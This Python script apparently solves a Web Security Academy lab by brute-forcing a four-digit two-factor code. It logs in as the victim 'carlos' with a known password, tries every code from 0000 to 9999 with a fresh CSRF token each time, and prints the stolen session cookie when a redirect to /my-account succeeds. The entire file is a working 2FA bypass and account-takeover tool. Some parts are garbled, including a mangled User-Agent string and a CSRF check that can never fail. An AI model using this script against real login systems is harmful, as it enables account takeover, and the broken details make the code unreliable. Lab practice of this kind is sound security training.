import requests
from bs4 import BeautifulSoup




BASE_URL = "https://0a13000703dc90cb010001d.web-security-academy.net"            # add your main url (remove forward slash '/' in end of url)
LOGIN_URL = BASE_URL + "/login"
LOGIN2_URL = BASE_URL + "/login2"
ACCOUNT_URL = BASE_URL + "/my-account"

USERNAME = "carlos"
PASSWORD = "montoya"

HEADERS = {
    "User-Agent": "Mozilla/.0 (X11; Linux x; rv:8.0) Gecko/101 Firefox/1.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded"
}


def extract_csrf_token(html_res):

    soup = BeautifulSoup(html_res, 'html.parser')
    token_tag = soup.find("input", {"name": "csrf"})
    if not token_tag:
        return 'no csrf , you\'re in wrong url or endpoint'
    return token_tag['value']

def login(session):


    res = session.get(LOGIN_URL, headers=HEADERS)
    csrf = extract_csrf_token(res.text)
    if not csrf:
        print("[x] can't found CSRF in /login")
        return None


    session.post(LOGIN_URL, data={
        "csrf": csrf,
        "username": USERNAME,
        "password": PASSWORD
    }, headers=HEADERS)


    res = session.get(LOGIN2_URL, headers=HEADERS)
    csrf2 = extract_csrf_token(res.text)
    if not csrf2:
        print("[x] can't found CSRF in /login2")
    return csrf2

def brute_force_2fa():
    for code in range(10000):
        code_str = f"{code:04}"


        session = requests.Session()
        session.headers.update(HEADERS)

        try:
            csrf_2fa = login(session)
            if not csrf_2fa:
                print(f"[!] Failed to get CSRF for code {code_str}")
                continue


            res = session.post(LOGIN2_URL, data={
                "csrf": csrf_2fa,
                "mfa-code": code_str
            }, headers=HEADERS, allow_redirects=False)


            if res.status_code == 302 and "/my-account" in res.headers.get("Location", ""):

                session_token = session.cookies.get_dict().get("session")
                print(f"\n[+] ✅ 2FA code found: {code_str}")
                print(f"[🔐] Change your Session Token wiht this to acess carlos  : {session_token}")

               

                break

            else:
                print(f"[-] failed {code_str} \t→ status: {res.status_code}")

        except Exception as e:
            print(f"[!] Error at {code_str} → {e}")
            continue

if __name__ == "__main__":
    brute_force_2fa()

